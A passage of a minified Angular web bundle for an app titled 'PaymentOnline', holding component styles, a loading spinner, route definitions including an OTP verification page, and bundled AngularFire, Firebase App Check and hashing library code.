#ddd}.btn-outline-primary[_ngcontent-%COMP%]{color:#000;background-color:#ddd;border:1px solid #ddd}.btn-outline-primary[_ngcontent-%COMP%]:hover{background-color:#05cf48;border:1px solid #ddd}.btn-check[_ngcontent-%COMP%]:active + .btn-outline-primary[_ngcontent-%COMP%], .btn-check[_ngcontent-%COMP%]:checked + .btn-outline-primary[_ngcontent-%COMP%], .btn-outline-primary.active[_ngcontent-%COMP%], .btn-outline-primary.dropdown-toggle.show[_ngcontent-%COMP%], .btn-outline-primary[_ngcontent-%COMP%]:active{color:#baf0c3;background-color:#3ecc6d;box-shadow:none;border:1px solid #ddd}.btn-group[_ngcontent-%COMP%] > .btn-group[_ngcontent-%COMP%]:not(:last-child) > .btn[_ngcontent-%COMP%], .btn-group[_ngcontent-%COMP%] > .btn[_ngcontent-%COMP%]:not(:last-child):not(.dropdown-toggle), .btn-group[_ngcontent-%COMP%] > .btn-group[_ngcontent-%COMP%]:not(:first-child) > .btn[_ngcontent-%COMP%], .btn-group[_ngcontent-%COMP%] > .btn[_ngcontent-%COMP%]:nth-child(n+3), .btn-group[_ngcontent-%COMP%] > [_ngcontent-%COMP%]:not(.btn-check) + .btn[_ngcontent-%COMP%]{border-radius:50px;margin-right:20px}form[_ngcontent-%COMP%]{font-size:14px}form[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]{width:100%;height:45px;display:flex;flex-direction:column;justify-content:center;align-items:center;background-color:#3ecc6d;border:1px solid #ddd}form[_ngcontent-%COMP%]   .btn.btn-primary[_ngcontent-%COMP%]:hover{background-color:#05cf48}@media (max-width:750px){.container[_ngcontent-%COMP%]{padding:10px;width:100%}.text-green[_ngcontent-%COMP%]{font-size:14px}.card.box1[_ngcontent-%COMP%], .card.box2[_ngcontent-%COMP%]{width:100%}.nav.nav-tabs[_ngcontent-%COMP%]   .nav-item[_ngcontent-%COMP%]   .nav-link[_ngcontent-%COMP%]{font-size:12px}}']})};var Zh=class n{static \u0275fac=function(t){return new(t||n)};static \u0275cmp=Bn({type:n,selectors:[["app-loader"]],standalone:!1,decls:2,vars:0,consts:[[1,"loading"]],template:function(t,r){t&1&&(he(0,"div",0),Ue(1,"Loading\u2026"),de())},styles:['.loading[_ngcontent-%COMP%]{position:fixed;z-index:999;overflow:show;margin:auto;inset:0;width:50px;height:50px}.loading[_ngcontent-%COMP%]:before{content:"";display:block;position:fixed;top:0;left:0;width:100%;height:100%;background-color:#ffffff80}.loading[_ngcontent-%COMP%]:not(:required){font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.loading[_ngcontent-%COMP%]:not(:required):after{content:"";display:block;font-size:10px;width:50px;height:50px;margin-top:-.5em;border:15px solid rgba(33,150,243,1);border-radius:100%;border-bottom-color:transparent;-webkit-animation:_ngcontent-%COMP%_spinner 1s linear 0s infinite;animation:_ngcontent-%COMP%_spinner 1s linear 0s infinite}@-webkit-keyframes _ngcontent-%COMP%_spinner{0%{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0)}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes spinner{0%{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0)}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@-o-keyframes spinner{0%{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0)}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes _ngcontent-%COMP%_spinner{0%{-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0)}to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}']})};var Dj=[{path:"",component:Qh},{path:"verifyOTP",component:Yh},{path:"loader",component:Zh}],Jh=class n{static \u0275fac=function(t){return new(t||n)};static \u0275mod=Qe({type:n});static \u0275inj=Ke({imports:[Cv.forRoot(Dj),Cv]})};var Xh=class n{title="PaymentOnline";static \u0275fac=function(t){return new(t||n)};static \u0275cmp=Bn({type:n,selectors:[["app-root"]],standalone:!1,decls:2,vars:0,consts:[[2,"display","flex","justify-content","center"]],template:function(t,r){t&1&&(he(0,"div",0),Dt(1,"router-outlet"),de())},dependencies:[vv],encapsulation:2})};var Cj="firebase",bj="10.14.1";Ur(Cj,bj,"app");var Fs=new dr("ANGULARFIRE2_VERSION");var Tj=(n,e)=>{let t=e?[e]:lD(),r=[];return t.forEach(i=>{i.container.getProvider(n).instances.forEach(s=>{r.includes(s)||r.push(s)})}),r},io=class{constructor(){return Tj(Sj)}},Sj="app-check";function Pv(){}var ef=class{zone;delegate;constructor(e,t=bg){this.zone=e,this.delegate=t}now(){return this.delegate.now()}schedule(e,t,r){let i=this.zone,o=function(s){i.runGuarded(()=>{e.apply(this,[s])})};return this.delegate.schedule(o,t,r)}},kv=class{zone;task=null;constructor(e){this.zone=e}call(e,t){let r=this.unscheduleTask.bind(this);return this.task=this.zone.run(()=>Zone.current.scheduleMacroTask("firebaseZoneBlock",Pv,{},Pv,Pv)),t.pipe(nt({next:r,complete:r,error:r})).subscribe(e).add(r)}unscheduleTask(){setTimeout(()=>{this.task!=null&&this.task.state==="scheduled"&&(this.task.invoke(),this.task=null)},10)}},tf=(()=>{class n{ngZone;outsideAngular;insideAngular;constructor(t){this.ngZone=t,this.outsideAngular=t.runOutsideAngular(()=>new ef(Zone.current)),this.insideAngular=t.run(()=>new ef(Zone.current,Ja)),globalThis.\u0275AngularFireScheduler||=this}static \u0275fac=function(r){return new(r||n)(L(pe))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function Aj(){let n=globalThis.\u0275AngularFireScheduler;if(!n)throw new Error(`Either AngularFireModule has not been provided in your AppModule (this can be done manually or implictly using
provideFirebaseApp) or you're calling an AngularFire method outside of an NgModule (which is not supported).`);return n}function Gt(n){return Mj(Aj())(n)}function Mj(n){return function(t){return t=t.lift(new kv(n.ngZone)),t.pipe(wn(n.outsideAngular),sn(n.insideAngular))}}var xj="firebase",Rj="10.14.1";jt.registerVersion(xj,Rj,"app-compat");var Nj=["ngOnDestroy"],iA=(n,e,t,r={})=>new Proxy(n,{get:(i,o)=>t.runOutsideAngular(()=>{if(n[o])return r?.spy?.get&&r.spy.get(o,n[o]),n[o];if(Nj.indexOf(o)>-1)return()=>{};let s=e.toPromise().then(a=>{let c=a?.[o];return typeof c=="function"?c.bind(a):c?.then?c.then(l=>t.run(()=>l)):t.run(()=>c)});return new Proxy(()=>{},{get:(a,c)=>s[c],apply:(a,c,l)=>s.then(h=>{let p=h?.(...l);return r?.spy?.apply&&r.spy.apply(o,l,p),p})})})});var nf=class{constructor(e){return e}},Vs=new j("angularfire2.app.options"),Ls=new j("angularfire2.app.name");function iu(n,e,t){let r=typeof t=="string"&&t||"[DEFAULT]",i=typeof t=="object"&&t||{};i.name=i.name||r;let s=jt.apps.filter(a=>a&&a.name===i.name)[0]||e.runOutsideAngular(()=>jt.initializeApp(n,i));try{if(JSON.stringify(n)!==JSON.stringify(s.options)){let a=!!module.hot;Pj("error",`${s.name} Firebase App already initialized with different options${a?", you may need to reload as Firebase is not HMR aware.":"."}`)}}catch{}return new nf(s)}var Pj=(n,...e)=>{gy()&&typeof console<"u"&&console[n](...e)},kj={provide:nf,useFactory:iu,deps:[Vs,pe,[new fc,Ls]]},oA=(()=>{class n{static initializeApp(t,r){return{ngModule:n,providers:[{provide:Vs,useValue:t},{provide:Ls,useValue:r}]}}constructor(t){jt.registerVersion("angularfire",Fs.full,"core"),jt.registerVersion("angularfire",Fs.full,"app-compat"),jt.registerVersion("angular",zb.full,t.toString())}static \u0275fac=function(r){return new(r||n)(L(Ot))};static \u0275mod=Qe({type:n});static \u0275inj=Ke({providers:[kj]})}return n})();function rf(n,e,t,r,i){let[,o,s]=globalThis.\u0275AngularfireInstanceCache.find(a=>a[0]===n)||[];if(o)return Oj(i,s)||(rA("error",`${e} was already initialized on the ${t} Firebase App with different settings.${Fj?" You may need to reload as Firebase is not HMR aware.":""}`),rA("warn",{is:i,was:s})),o;{let a=r();return globalThis.\u0275AngularfireInstanceCache.push([n,a,i]),a}}function Oj(n,e){try{return n.toString()===e.toString()}catch{return n===e}}var Fj=typeof module<"u"&&!!module.hot,rA=(n,...e)=>{gy()&&typeof console<"u"&&console[n](...e)};globalThis.\u0275AngularfireInstanceCache||=[];var Uj=new Map,jj={activated:!1,tokenObservers:[]},Bj={initialized:!1,enabled:!1};function An(n){return Uj.get(n)||Object.assign({},jj)}function lA(){return Bj}var $j="https://content-firebaseappcheck.googleapis.com/v1";var Hj="exchangeDebugToken",sA={OFFSET_DURATION:5*60*1e3,RETRIAL_MIN_WAIT:30*1e3,RETRIAL_MAX_WAIT:16*60*1e3},K8=24*60*60*1e3;var Fv=class{constructor(e,t,r,i,o){if(this.operation=e,this.retryPolicy=t,this.getWaitDuration=r,this.lowerBound=i,this.upperBound=o,this.pending=null,this.nextErrorWaitInterval=i,i>o)throw new Error("Proactive refresh lower bound greater than upper bound!")}start(){this.nextErrorWaitInterval=this.lowerBound,this.process(!0).catch(()=>{})}stop(){this.pending&&(this.pending.reject("cancelled"),this.pending=null)}isRunning(){return!!this.pending}process(e){return R(this,null,function*(){this.stop();try{this.pending=new rg,this.pending.promise.catch(t=>{}),yield qj(this.getNextRun(e)),this.pending.resolve(),yield this.pending.promise,this.pending=new rg,this.pending.promise.catch(t=>{}),yield this.operation(),this.pending.resolve(),yield this.pending.promise,this.process(!0).catch(()=>{})}catch(t){this.retryPolicy(t)?this.process(!1).catch(()=>{}):this.stop()}})}getNextRun(e){if(e)return this.nextErrorWaitInterval=this.lowerBound,this.getWaitDuration();{let t=this.nextErrorWaitInterval;return this.nextErrorWaitInterval*=2,this.nextErrorWaitInterval>this.upperBound&&(this.nextErrorWaitInterval=this.upperBound),t}}};function qj(n){return new Promise(e=>{setTimeout(e,n)})}var zj={"already-initialized":"You have already called initializeAppCheck() for FirebaseApp {$appName} with different options. To avoid this error, call initializeAppCheck() with the same options as when it was originally called. This will return the already initialized instance.","use-before-activation":"App Check is being used before initializeAppCheck() is called for FirebaseApp {$appName}. Call initializeAppCheck() before instantiating other Firebase services.","fetch-network-error":"Fetch failed to connect to a network. Check Internet connection. Original error: {$originalErrorMessage}.","fetch-parse-error":"Fetch client could not parse response. Original error: {$originalErrorMessage}.","fetch-status-error":"Fetch server returned an HTTP error status. HTTP status: {$httpStatus}.","storage-open":"Error thrown when opening storage. Original error: {$originalErrorMessage}.","storage-get":"Error thrown when reading from storage. Original error: {$originalErrorMessage}.","storage-set":"Error thrown when writing to storage. Original error: {$originalErrorMessage}.","recaptcha-error":"ReCAPTCHA error.",throttled:"Requests throttled due to {$httpStatus} error. Attempts allowed again after {$time}"},li=new cD("appCheck","AppCheck",zj);function dA(n){if(!An(n).activated)throw li.create("use-before-activation",{appName:n.name})}function hA(r,i){return R(this,arguments,function*({url:n,body:e},t){let o={"Content-Type":"application/json"},s=t.getImmediate({optional:!0});if(s){let y=yield s.getHeartbeatsHeader();y&&(o["X-Firebase-Client"]=y)}let a={method:"POST",body:JSON.stringify(e),headers:o},c;try{c=yield fetch(n,a)}catch(y){throw li.create("fetch-network-error",{originalErrorMessage:y?.message})}if(c.status!==200)throw li.create("fetch-status-error",{httpStatus:c.status});let l;try{l=yield c.json()}catch(y){throw li.create("fetch-parse-error",{originalErrorMessage:y?.message})}let h=l.ttl.match(/^([\d.]+)(s)$/);if(!h||!h[2]||isNaN(Number(h[1])))throw li.create("fetch-parse-error",{originalErrorMessage:`ttl field (timeToLive) is not in standard Protobuf Duration format: ${l.ttl}`});let p=Number(h[1])*1e3,m=Date.now();return{token:l.token,expireTimeMillis:m+p,issuedAtTimeMillis:m}})}function fA(n,e){let{projectId:t,appId:r,apiKey:i}=n.options;return{url:`${$j}/projects/${t}/apps/${r}:${Hj}?key=${i}`,body:{debug_token:e}}}var Gj="firebase-app-check-database",Wj=1,Vv="firebase-app-check-store";var of=null;function Kj(){return of||(of=new Promise((n,e)=>{try{let t=indexedDB.open(Gj,Wj);t.onsuccess=r=>{n(r.target.result)},t.onerror=r=>{var i;e(li.create("storage-open",{originalErrorMessage:(i=r.target.error)===null||i===void 0?void 0:i.message}))},t.onupgradeneeded=r=>{let i=r.target.result;switch(r.oldVersion){case 0:i.createObjectStore(Vv,{keyPath:"compositeKey"})}}}catch(t){e(li.create("storage-open",{originalErrorMessage:t?.message}))}}),of)}function Qj(n,e){return Yj(Zj(n),e)}function Yj(n,e){return R(this,null,function*(){let r=(yield Kj()).transaction(Vv,"readwrite"),o=r.objectStore(Vv).put({compositeKey:n,value:e});return new Promise((s,a)=>{o.onsuccess=c=>{s()},r.onerror=c=>{var l;a(li.create("storage-set",{originalErrorMessage:(l=c.target.error)===null||l===void 0?void 0:l.message}))}})})}function Zj(n){return`${n.options.appId}-${n.name}`}var Lv=new hl("@firebase/app-check");function Ov(n,e){return dl()?Qj(n,e).catch(t=>{Lv.warn(`Failed to write token to IndexedDB. Error: ${t}`)}):Promise.resolve()}function pA(){return lA().enabled}function gA(){return R(this,null,function*(){let n=lA();if(n.enabled&&n.token)return n.token.promise;throw Error(`
            Can't get debug token in production mode.
        `)})}var Jj={error:"UNKNOWN_ERROR"};function Xj(n){return oD.encodeString(JSON.stringify(n),!1)}function Uv(n,e=!1){return R(this,null,function*(){let t=n.app;dA(t);let r=An(t),i=r.token,o;if(i&&!ou(i)&&(r.token=void 0,i=void 0),!i){let c=yield r.cachedTokenPromise;c&&(ou(c)?i=c:yield Ov(t,void 0))}if(!e&&i&&ou(i))return{token:i.token};let s=!1;if(pA()){r.exchangeTokenPromise||(r.exchangeTokenPromise=hA(fA(t,yield gA()),n.heartbeatServiceProvider).finally(()=>{r.exchangeTokenPromise=void 0}),s=!0);let c=yield r.exchangeTokenPromise;return yield Ov(t,c),r.token=c,{token:c.token}}try{r.exchangeTokenPromise||(r.exchangeTokenPromise=r.provider.getToken().finally(()=>{r.exchangeTokenPromise=void 0}),s=!0),i=yield An(t).exchangeTokenPromise}catch(c){c.code==="appCheck/throttled"?Lv.warn(c.message):Lv.error(c),o=c}let a;return i?o?ou(i)?a={token:i.token,internalError:o}:a=cA(o):(a={token:i.token},r.token=i,yield Ov(t,i)):a=cA(o),s&&rB(t,a),a})}function eB(n){return R(this,null,function*(){let e=n.app;dA(e);let{provider:t}=An(e);if(pA()){let r=yield gA(),{token:i}=yield hA(fA(e,r),n.heartbeatServiceProvider);return{token:i}}else{let{token:r}=yield t.getToken();return{token:r}}})}function tB(n,e,t,r){let{app:i}=n,o=An(i),s={next:t,error:r,type:e};if(o.tokenObservers=[...o.tokenObservers,s],o.token&&ou(o.token)){let a=o.token;Promise.resolve().then(()=>{t({token:a.token}),aA(n)}).catch(()=>{})}o.cachedTokenPromise.then(()=>aA(n))}function mA(n,e){let t=An(n),r=t.tokenObservers.filter(i=>i.next!==e);r.length===0&&t.tokenRefresher&&t.tokenRefresher.isRunning()&&t.tokenRefresher.stop(),t.tokenObservers=r}function aA(n){let{app:e}=n,t=An(e),r=t.tokenRefresher;r||(r=nB(n),t.tokenRefresher=r),!r.isRunning()&&t.isTokenAutoRefreshEnabled&&r.start()}function nB(n){let{app:e}=n;return new Fv(()=>R(this,null,function*(){let t=An(e),r;if(t.token?r=yield Uv(n,!0):r=yield Uv(n),r.error)throw r.error;if(r.internalError)throw r.internalError}),()=>!0,()=>{let t=An(e);if(t.token){let r=t.token.issuedAtTimeMillis+(t.token.expireTimeMillis-t.token.issuedAtTimeMillis)*.5+3e5,i=t.token.expireTimeMillis-5*60*1e3;return r=Math.min(r,i),Math.max(0,r-Date.now())}else return 0},sA.RETRIAL_MIN_WAIT,sA.RETRIAL_MAX_WAIT)}function rB(n,e){let t=An(n).tokenObservers;for(let r of t)try{r.type==="EXTERNAL"&&e.error!=null?r.error(e.error):r.next(e)}catch{}}function ou(n){return n.expireTimeMillis-Date.now()>0}function cA(n){return{token:Xj(Jj),error:n}}var jv=class{constructor(e,t){this.app=e,this.heartbeatServiceProvider=t}_delete(){let{tokenObservers:e}=An(this.app);for(let t of e)mA(this.app,t.next);return Promise.resolve()}};function iB(n,e){return new jv(n,e)}function oB(n){return{getToken:e=>Uv(n,e),getLimitedUseToken:()=>eB(n),addTokenListener:e=>tB(n,"INTERNAL",e),removeTokenListener:e=>mA(n.app,e)}}var sB="@firebase/app-check",aB="0.8.8";var cB="app-check",uA="app-check-internal";function uB(){Ga(new Oi(cB,n=>{let e=n.getProvider("app").getImmediate(),t=n.getProvider("heartbeat");return iB(e,t)},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((n,e,t)=>{n.getProvider(uA).initialize()})),Ga(new Oi(uA,n=>{let e=n.getProvider("app-check").getImmediate();return oB(e)},"PUBLIC").setInstantiationMode("EXPLICIT")),Ur(sB,aB)}uB();var lB=["localhost","0.0.0.0","127.0.0.1"],sW=typeof window<"u"&&lB.includes(window.location.hostname);var Bv=new j("angularfire2.auth.use-emulator"),$v=new j("angularfire2.auth.settings"),Hv=new j("angularfire2.auth.tenant-id"),qv=new j("angularfire2.auth.langugage-code"),zv=new j("angularfire2.auth.use-device-language"),Gv=new j("angularfire.auth.persistence"),Wv=(n,e,t,r,i,o,s,a)=>rf(`${n.name}.auth`,"AngularFireAuth",n.name,()=>{let c=e.runOutsideAngular(()=>n.auth());if(t&&c.useEmulator(...t),r&&(c.tenantId=r),c.languageCode=i,o&&c.useDeviceLanguage(),s)for(let[l,h]of Object.entries(s))c.settings[l]=h;return a&&c.setPersistence(a),c},[t,r,i,o,s,a]),vA=(()=>{class n{authState;idToken;user;idTokenResult;credential;constructor(t,r,i,o,s,a,c,l,h,p,m,y){let D=new Ve,b=J(void 0).pipe(sn(s.outsideAngular),Le(()=>o.runOutsideAngular(()=>import("./chunk-3GWKGN6G.js"))),X(()=>iu(t,o,r)),X(T=>Wv(T,o,a,l,h,p,c,m)),zl({bufferSize:1,refCount:!1}));if(ri(i))this.authState=this.user=this.idToken=this.idTokenResult=this.credential=J(null);else{b.pipe(an()).subscribe();let T=b.pipe(Le(P=>P.getRedirectResult().then(G=>G,()=>null)),Gt,zl({bufferSize:1,refCount:!1})),F=b.pipe(Le(P=>new se(G=>({unsubscribe:o.runOutsideAngular(()=>P.onAuthStateChanged(Z=>G.next(Z),Z=>G.error(Z),()=>G.complete()))})))),$=b.pipe(Le(P=>new se(G=>({unsubscribe:o.runOutsideAngular(()=>P.onIdTokenChanged(Z=>G.next(Z),Z=>G.error(Z),()=>G.complete()))}))));this.authState=T.pipe(Gl(F),wn(s.outsideAngular),sn(s.insideAngular)),this.user=T.pipe(Gl($),wn(s.outsideAngular),sn(s.insideAngular)),this.idToken=this.user.pipe(Le(P=>P?me(P.getIdToken()):J(null))),this.idTokenResult=this.user.pipe(Le(P=>P?me(P.getIdTokenResult()):J(null))),this.credential=Mg(T,D,this.authState.pipe(ut(P=>!P))).pipe(X(P=>P?.user?P:null),wn(s.outsideAngular),sn(s.insideAngular))}return iA(this,b,o,{spy:{apply:(T,F,$)=>{(T.startsWith("signIn")||T.startsWith("createUser"))&&$.then(P=>D.next(P))}}})}static \u0275fac=function(r){return new(r||n)(L(Vs),L(Ls,8),L(Ot),L(pe),L(tf),L(Bv,8),L($v,8),L(Hv,8),L(qv,8),L(zv,8),L(Gv,8),L(io,8))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"any"})}return n})();var _A=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},wA={};var di,Kv;(function(){var n;function e(E,v){function w(){}w.prototype=v.prototype,E.D=v.prototype,E.prototype=new w,E.prototype.constructor=E,E.C=function(I,C,A){for(var _=Array(arguments.length-2),er=2;er<arguments.length;er++)_[er-2]=arguments[er];return v.prototype[C].apply(I,_)}}function t(){this.blockSize=-1}function r(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.B=Array(this.blockSize),this.o=this.h=0,this.s()}e(r,t),r.prototype.s=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(E,v,w){w||(w=0);var I=Array(16);if(typeof v=="string")for(var C=0;16>C;++C)I[C]=v.charCodeAt(w++)|v.charCodeAt(w++)<<8|v.charCodeAt(w++)<<16|v.charCodeAt(w++)<<24;else for(C=0;16>C;++C)I[C]=v[w++]|v[w++]<<8|v[w++]<<16|v[w++]<<24;v=E.g[0],w=E.g[1],C=E.g[2];var A=E.g[3],_=v+(A^w&(C^A))+I[0]+3614090360&4294967295;v=w+(_<<7&4294967295|_>>>25),_=A+(C^v&(w^C))+I[1]+3905402710&4294967295,A=v+(_<<12&4294967295|_>>>20),_=C+(w^A&(v^w))+I[2]+606105819&4294967295,C=A+(_<<17&4294967295|_>>>15),_=w+(v^C&(A^v))+I[3]+3250441966&4294967295,w=C+(_<<22&4294967295|_>>>10),_=v+(A^w&(C^A))+I[4]+4118548399&4294967295,v=w+(_<<7&4294967295|_>>>25),_=A+(C^v&(w^C))+I[5]+1200080426&4294967295,A=v+(_<<12&4294967295|_>>>20),_=C+(w^A&(v^w))+I[6]+2821735955&4294967295,C=A+(_<<17&4294967295|_>>>15),_=w+(v^C&(A^v))+I[7]+4249261313&4294967295,w=C+(_<<22&4294967295|_>>>10),_=v+(A^w&(C^A))+I[8]+1770035416&4294967295,v=w+(_<<7&4294967295|_>>>25),_=A+(C^v&(w^C))+I[9]+2336552879&4294967295,A=v+(_<<12&4294967295|_>>>20),_=C+(w^A&(v^w))+I[10]+4294925233&4294967295,C=A+(_<<17&4294967295|_>>>15),_=w+(v^C&(A^v))+I[11]+2304563134&4294967295,w=C+(_<<22&4294967295|_>>>10),_=v+(A^w&(C^A))+I[12]+1804603682&4294967295,v=w+(_<<7&4294967295|_>>>25),_=A+(C^v&(w^C))+I[13]+4254626195&4294967295,A=v+(_<<12&4294967295|_>>>20),_=C+(w^A&(v^w))+I[14]+2792965006&4294967295,C=A+(_<<17&4294967295|_>>>15),_=w+(v^C&(A^v))+I[15]+1236535329&4294967295,w=C+(_<<22&4294967295|_>>>10),_=v+(C^A&(w^C))+I[1]+4129170786&4294967295,v=w+(_<<5&4294967295|_>>>27),_=A+(w^C&(v^w))+I[6]+3225465664&4294967295,A=v+(_<<9&4294967295|_>>>23),_=C+(v^w&(A^v))+I[11]+643717713&4294967295,C=A+(_<<14&4294967295|_>>>18),_=w+(A^v&(C^A))+I[0]+3921069994&4294967295,w=C+(_<<20&4294967295|_>>>12),_=v+(C^A&(w^C))+I[5]+3593408605&4294967295,v=w+(_<<5&4294967295|_>>>27),_=A+(w^C&(v^w))+I[10]+38016083&4294967295,A=v+(_<<9&4294967295|_>>>23),_=C+(v^w&(A^v))+I[15]+3634488961&4294967295,C=A+(_<<14&4294967295|_>>>18),_=w+(A^v&(C^A))+I[4]+3889429448&4294967295,w=C+(_<<20&4294967295|_>>>12),_=v+(C^A&(w^C))+I[9]+568446438&4294967295,v=w+(_<<5&4294967295|_>>>27),_=A+(w^C&(v^w))+I[14]+3275163606&4294967295,A=v+(_<<9&4294967295|_>>>23),_=C+(v^w&(A^v))+I[3]+4107603335&4294967295,C=A+(_<<14&4294967295|_>>>18),_=w+(A^v&(C^A))+I[8]+1163531501&4294967295,w=C+(_<<20&4294967295|_>>>12),_=v+(C^A&(w^C))+I[13]+2850285829&4294967295,v=w+(_<<5&4294967295|_>>>27),_=A+(w^C&(v^w))+I[2]+4243563512&4294967295,A=v+(_<<9&4294967295|_>>>23),_=C+(v^w&(A^v))+I[7]+1735328473&4294967295,C=A+(_<<14&4294967295|_>>>18),_=w+(A^v&(C^A))+I[12]+2368359562&4294967295,w=C+(_<<20&4294967295|_>>>12),_=v+(w^C^A)+I[5]+4294588738&4294967295,v=w+(_<<4&4294967295|_>>>28),_=A+(v^w^C)+I[8]+2272392833&4294967295,A=v+(_<<11&4294967295|_>>>21),_=C+(A^v^w)+I[11]+1839030562&4294967295,C=A+(_<<16&4294967295|_>>>16),_=w+(C^A^v)+I[14]+4259657740&4294967295,w=C+(_<<23&4294967295|_>>>9),_=v+(w^C^A)+I[1]+2763975236&4294967295,v=w+(_<<4&4294967295|_>>>28),_=A+(v^w^C)+I[4]+1272893353&4294967295,A=v+(_<<11&4294967295|_>>>21),_=C+(A^v^w)+I[7]+4139469664&4294967295,C=A+(_<<16&4294967295|_>>>16),_=w+(C^A^v)+I[10]+3200236656&4294967295,w=C+(_<<23&4294967295|_>>>9),_=v+(w^C^A)+I[13]+681279174&4294967295,v=w+(_<<4&4294967295|_>>>28),_=A+(v^w^C)+I[0]+3936430074&4294967295,A=v+(_<<11&4294967295|_>>>21),_=C+(A^v^w)+I[3]+3572445317&4294967295,C=A+(_<<16&4294967295|_>>>16),_=w+(C^A^v)+I[6]+76029189&4294967295,w=C+(_<<23&4294967295|_>>>9),_=v+(w^C^A)+I[9]+3654602809&4294967295,v=w+(_<<4&4294967295|_>>>28),_=A+(v^w^C)+I[12]+3873151461&4294967295,A=v+(_<<11&4294967295|_>>>21),_=C+(A^v^w)+I[15]+530742520&4294967295,C=A+(_<<16&4294967295|_>>>16),_=w+(C^A^v)+I[2]+3299628645&4294967295,w=C+(_<<23&4294967295|_>>>9),_=v+(C^(w|~A))+I[0]+4096336452&4294967295,v=w+(_<<6&4294967295|_>>>26),_=A+(w^(v|~C))+I[7]+1126891415&4294967295,A=v+(_<<10&4294967295|_>>>22),_=C+(v^(A|~w))+I[14]+2878612391&4294967295,C=A+(_<<15&4294967295|_>>>17),_=w+(A^(C|~v))+I[5]+4237533241&4294967295,w=C+(_<<21&4294967295|_>>>11),_=v+(C^(w|~A))+I[12]+1700485571&4294967295,v=w+(_<<6&4294967295|_>>>26),_=A+(w^(v|~C))+I[3]+2399980690&4294967295,A=v+(_<<10&4294967295|_>>>22),_=C+(v^(A|~w))+I[10]+4293915773&4294967295,C=A+(_<<15&4294967295|_>>>17),_=w+(A^(C|~v))+I[1]+2240044497&4294967295,w=C+(_<<21&4294967295|_>>>11),_=v+(C^(w|~A))+I[8]+1873313359&4294967295,v=w+(_<<6&4294967295|_>>>26),_=A+(w^(v|~C))+I[15]+4264355552&4294967295,A=v+(_<<10&4294967295|_>>>22),_=C+(v^(A|~w))+I[6]+2734768916&4294967295,C=A+(_<<15&4294967295|_>>>17),_=w+(A^(C|~v))+I[13]+1309151649&4294967295,w=C+(_<<21&4294967295|_>>>11),_=v+(C^(w|~A))+I[4]+4149444226&4294967295,v=w+(_<<6&4294967295|_>>>26),_=A+(w^(v|~C))+I[11]+3174756917&4294967295,A=v+(_<<10&4294967295|_>>>22),_=C+(v^(A|~w))+I[2]+718787259&4294967295,C=A+(_<<15&4294967295|_>>>17),_=w+(A^(C|~v))+I[9]+3951481745&4294967295,E.g[0]=E.g[0]+v&4294967295,E.g[1]=E.g[1]+(C+(_<<21&4294967295|_>>>11))&4294967295,E.g[2]=E.g[2]+C&4294967295,E.g[3]=E.g[3]+A&4294967295}r.prototype.u=function(E,v){v===void 0&&(v=E.length);for(var w=v-this.blockSize,I=this.B,C=this.h,A=0;A<v;){if(C==0)for(;A<=w;)i(this,E,A),A+=this.blockSize;if(typeof E=="string"){for(;A<v;)if(I[C++]=E.charCodeAt(A++),C==this.blockSize){i(this,I),C=0;break}}else for(;A<v;)if(I[C++]=E[A++],C==this.blockSize){i(this,I),C=0;break}}this.h=C,this.o+=v},r.prototype.v=function(){var E=Array((56>this.h?this.blockSize:2*this.blockSize)-this.h);E[0]=128;for(var v=1;v<E.length-8;++v)E[v]=0;var w=8*this.o;for(v=E.length-8;v<E.length;++v)E[v]=w&255,w/=256;for(this.u(E),E=Array(16),v=w=0;4>v;++v)for(var I=0;32>I;I+=8)E[w++]=this.g[v]>>>I&255;return E};function o(E,v){var w=a;return Object.prototype.hasOwnProperty.call(w,E)?w[E]:w[E]=v(E)}function s(E,v){this.h=v;for(var w=[],I=!0,C=E.length-1;0<=C;C--){var A=E[C]|0;I&&A==v||(w[C]=A,I=!1)}this.g=w}var a={};function c(E){return-128<=E&&128>E?o(E,function(v){return new s([v|0],0>v?-1:0)}):new s([E|0],0>E?-1:0)}function l(E){if(isNaN(E)||!isFinite(E))return p;if(0>E)return T(l(-E));for(var v=[],w=1,I=0;E>=w;I++)v[I]=E/w|0,w*=4294967296;return new s(v,0)}function h(E,v){if(E.length==0)throw Error("number format error: empty string");if(v=v||10,2>v||36<v)throw Error("radix out of range: "+v);if(E.charAt(0)=="-")return T(h(E.substring(1),v));if(0<=E.indexOf("-"))throw Error('number format error: interior "-" character');for(var w=l(Math.pow(v,8)),I=p,C=0;C<E.length;C+=8){var A=Math.min(8,E.length-C),_=parseInt(E.substring(C,C+A),v);8>A?(A=l(Math.pow(v,A)),I=I.j(A).add(l(_))):(I=I.j(w),I=I.add(l(_)))}return I}var p=c(0),m=c(1),y=c(16777216);n=s.prototype,n.m=function(){if(b(this))return-T(this).m();for(var E=0,v=1,w=0;w<this.g.length;w++){var I=this.i(w);E+=(0<=I?I:4294967296+I)*v,v*=4294967296}return 